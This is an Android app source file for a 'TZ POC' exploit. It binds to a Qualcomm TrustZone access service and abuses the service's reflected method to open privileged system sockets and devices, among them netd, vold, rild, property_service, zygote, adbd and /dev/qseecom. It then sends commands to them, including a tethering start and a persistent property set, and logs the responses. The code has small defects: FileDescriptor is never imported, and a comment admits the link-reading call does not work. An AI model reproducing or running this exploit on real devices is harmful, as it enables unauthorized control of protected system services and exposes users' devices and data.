package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private Object tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            try {
                Class<?> stubClass = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                tzService = asInterface.invoke(null, service);
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } catch (Exception e) {
                appendLog("[TZ] asInterface error: " + e.toString());
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== Advanced TZ POC ==========");

        // 1. Enumerate /dev/socket
        String[] sockets = nativeListDir("/dev/socket");
        if (sockets == null) sockets = new String[0];
        appendLog("[*] Found " + sockets.length + " sockets");

        // 2. High-value targets including /dev/qseecom
        String[] knownTargets = {
                "/dev/socket/netd",
                "/dev/socket/dnsproxyd",
                "/dev/socket/fwmarkd",
                "/dev/socket/mdnsd",
                "/dev/socket/logd",
                "/dev/socket/property_service",
                "/dev/socket/vold",
                "/dev/socket/wpa_ctrl_0",
                "/dev/socket/rild",
                "/dev/socket/ppp",
                "/dev/socket/qmux_radio",
                "/dev/socket/qmux_audio",
                "/dev/socket/qmux_bluetooth",
                "/dev/socket/qmux_gps",
                "/dev/socket/tcm",
                "/dev/socket/location",
                "/dev/socket/zygote",
                "/dev/socket/adbd",
                "/dev/qseecom",
                "/dev/ion",
                "/dev/ashmem",
                "/dev/kgsl-3d0"
        };

        List<String> allTargets = new ArrayList<>();
        for (String s : knownTargets) allTargets.add(s);
        for (String s : sockets) {
            String full = "/dev/socket/" + s;
            if (!allTargets.contains(full)) allTargets.add(full);
        }

        // 3. Test each target
        for (String path : allTargets) {
            if (stopRequested.get()) break;
            appendLog("[+] Testing " + path);
            try {
                testSocket(path);
            } catch (Exception e) {
                appendLog("[!] Error testing " + path + ": " + e.getMessage());
            }
        }

        // 4. Additional info gathering
        appendLog("[*] Trying property read/write");
        tryPropertySet();

        appendLog("[*] Reading /proc/self/fd");
        tryReadProcFd();

        appendLog("========== EXPLOIT COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testSocket(String path) throws Exception {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket(path, handle);
            if (pfd == null) {
                appendLog("[ ] Failed to open " + path);
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[ ] Invalid FD for " + path);
                pfd.close();
                return;
            }
            appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");

            // If it's a socket, try to interact; if it's a device file, just read.
            if (path.startsWith("/dev/socket/")) {
                String base = new File(path).getName();
                switch (base) {
                    case "netd": testNetd(fd); break;
                    case "dnsproxyd": testDnsProxy(fd); break;
                    case "fwmarkd": testFwmarkd(fd); break;
                    case "mdnsd": testMdnsd(fd); break;
                    case "logd": testLogd(fd); break;
                    case "property_service": testPropertyService(fd); break;
                    case "wpa_ctrl_0": testWpaCtrl(fd); break;
                    case "rild": testRild(fd); break;
                    case "vold": testVold(fd); break;
                    default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n", "list\n"});
                }
            } else {
                // Device file: read first few bytes
                InputStream is = new FileInputStream(fd);
                byte[] buf = new byte[64];
                int read = readBytes(is, buf, 64, 500);
                if (read > 0) {
                    appendLog("[DEV] Read " + read + " bytes from " + path + ": " + bytesToHex(buf, read));
                } else {
                    appendLog("[DEV] No data from " + path);
                }
                is.close();
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("[!] Exception testing " + path + ": " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private ParcelFileDescriptor openSocket(String path, int[] handle) throws Exception {
        if (tzService == null) return null;
        Class<?> cls = tzService.getClass();
        Method m = cls.getMethod("a", String.class, int[].class);
        return (ParcelFileDescriptor) m.invoke(tzService, path, handle);
    }

    private void testNetd(FileDescriptor fd) throws Exception {
        appendLog("[NETD] Testing netd commands");
        String[] cmds = {"help\n", "version\n", "interface list\n", "route list\n", "tether start 192.168.1.1 192.168.1.10\n", "dns resolver getservers\n"};
        for (String cmd : cmds) {
            if (stopRequested.get()) break;
            String resp = sendTextCommand(fd, cmd, 2000);
            appendLog("[NETD] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
        }
    }

    private void testDnsProxy(FileDescriptor fd) throws Exception {
        appendLog("[DNS] Sending DNS query for localhost");
        byte[] query = buildDnsQuery("localhost", 1);
        byte[] resp = sendBinary(fd, query, 512, 2000);
        if (resp != null && resp.length > 0) {
            int rcode = resp[3] & 0x0F;
            appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
        } else {
            appendLog("[DNS] No response");
        }
    }

    private void testFwmarkd(FileDescriptor fd) throws Exception {
        appendLog("[FW] Sending SELECT_NETWORK");
        ByteBuffer buf = ByteBuffer.allocate(16);
        buf.order(ByteOrder.LITTLE_ENDIAN);
        buf.putInt(6);
        buf.putInt(android.os.Process.myUid());
        buf.putInt(0);
        buf.putInt(0);
        byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
        if (resp != null && resp.length == 4) {
            int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
            appendLog("[FW] SELECT_NETWORK result=" + result);
        } else {
            appendLog("[FW] No/invalid response");
        }
    }

    private void testMdnsd(FileDescriptor fd) throws Exception {
        appendLog("[MDNS] Sending mDNS query");
        byte[] query = buildDnsQuery("localhost.local", 1);
        byte[] resp = sendBinary(fd, query, 512, 2000);
        if (resp != null && resp.length > 0) {
            appendLog("[MDNS] Response len=" + resp.length);
        } else {
            appendLog("[MDNS] No response");
        }
    }

    private void testLogd(FileDescriptor fd) throws Exception {
        appendLog("[LOGD] Reading logd (no command)");
        InputStream is = new FileInputStream(fd);
        byte[] buf = new byte[4096];
        int read = readBytes(is, buf, 4096, 1000);
        if (read > 0) {
            String str = new String(buf, 0, read, StandardCharsets.UTF_8);
            appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
        } else {
            appendLog("[LOGD] No data");
        }
        is.close();
    }

    private void testPropertyService(FileDescriptor fd) throws Exception {
        appendLog("[PROP] Sending get command");
        String resp = sendTextCommand(fd, "get ro.build.version.release\n", 1000);
        appendLog("[PROP] get response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
    }

    private void tryPropertySet() {
        try {
            int[] handle = new int[1];
            ParcelFileDescriptor pfd = openSocket("/dev/socket/property_service", handle);
            if (pfd == null) {
                appendLog("[PROP] Cannot open property_service");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[PROP] Invalid FD");
                pfd.close();
                return;
            }
            String cmd = "set persist.test.poc 1\n";
            String resp = sendTextCommand(fd, cmd, 500);
            appendLog("[PROP] set command response: " + (resp != null ? resp : "(none)"));
            pfd.close();
        } catch (Exception e) {
            appendLog("[PROP] Exception: " + e.getMessage());
        }
    }

    private void testWpaCtrl(FileDescriptor fd) throws Exception {
        appendLog("[WPA] Sending STATUS");
        String resp = sendTextCommand(fd, "STATUS\n", 1000);
        appendLog("[WPA] STATUS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
    }

    private void testRild(FileDescriptor fd) throws Exception {
        appendLog("[RILD] Sending AT+CGMI");
        byte[] at = "AT+CGMI\r\n".getBytes(StandardCharsets.UTF_8);
        byte[] resp = sendBinary(fd, at, 256, 1500);
        if (resp != null) {
            appendLog("[RILD] Response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
        } else {
            appendLog("[RILD] No response");
        }
    }

    private void testVold(FileDescriptor fd) throws Exception {
        appendLog("[VOLD] Sending status");
        String resp = sendTextCommand(fd, "status\n", 1000);
        appendLog("[VOLD] status response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
    }

    private void testGeneric(FileDescriptor fd, String[] cmds) throws Exception {
        for (String cmd : cmds) {
            if (stopRequested.get()) break;
            String resp = sendTextCommand(fd, cmd, 1000);
            appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
        }
    }

    private void tryReadProcFd() {
        appendLog("[PROC] Reading /proc/self/fd");
        String[] fds = nativeListDir("/proc/self/fd");
        if (fds == null) {
            appendLog("[PROC] Could not read fd directory");
            return;
        }
        for (String fd : fds) {
            if (stopRequested.get()) break;
            String link = "/proc/self/fd/" + fd;
            String target = nativeReadFile(link); // actually readlink, but nativeReadFile reads content; we'll try to read the link target by reading it as file (might fail)
            appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
        }
    }

    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
        OutputStream os = new FileOutputStream(fd);
        os.write(cmd.getBytes(StandardCharsets.UTF_8));
        os.flush();
        os.close();

        InputStream is = new FileInputStream(fd);
        byte[] buf = new byte[4096];
        int read = readBytes(is, buf, 4096, timeoutMs);
        is.close();
        if (read > 0) {
            return new String(buf, 0, read, StandardCharsets.UTF_8);
        }
        return null;
    }

    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
        OutputStream os = new FileOutputStream(fd);
        os.write(data);
        os.flush();
        os.close();

        InputStream is = new FileInputStream(fd);
        byte[] buf = new byte[maxResp];
        int read = readBytes(is, buf, maxResp, timeoutMs);
        is.close();
        if (read > 0) {
            byte[] resp = new byte[read];
            System.arraycopy(buf, 0, resp, 0, read);
            return resp;
        }
        return null;
    }

    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
        int total = 0;
        long start = System.currentTimeMillis();
        try {
            while (total < maxLen && System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int n = is.read(buffer, total, maxLen - total);
                    if (n <= 0) break;
                    total += n;
                } else {
                    Thread.sleep(20);
                }
            }
            return total;
        } catch (Exception e) {
            return -1;
        }
    }

    private byte[] buildDnsQuery(String name, int qtype) throws Exception {
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        baos.write(0x12); baos.write(0x34);
        baos.write(0x01); baos.write(0x00);
        baos.write(0x00); baos.write(0x01);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        for (String label : name.split("\\.")) {
            baos.write(label.length());
            baos.write(label.getBytes(StandardCharsets.US_ASCII));
        }
        baos.write(0);
        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
        baos.write(0x00); baos.write(0x01);
        return baos.toByteArray();
    }

    private String bytesToHex(byte[] bytes, int len) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len && i < 64; i++) {
            sb.append(String.format("%02x ", bytes[i]));
        }
        if (len > 64) sb.append("...");
        return sb.toString();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "tz_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ POC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
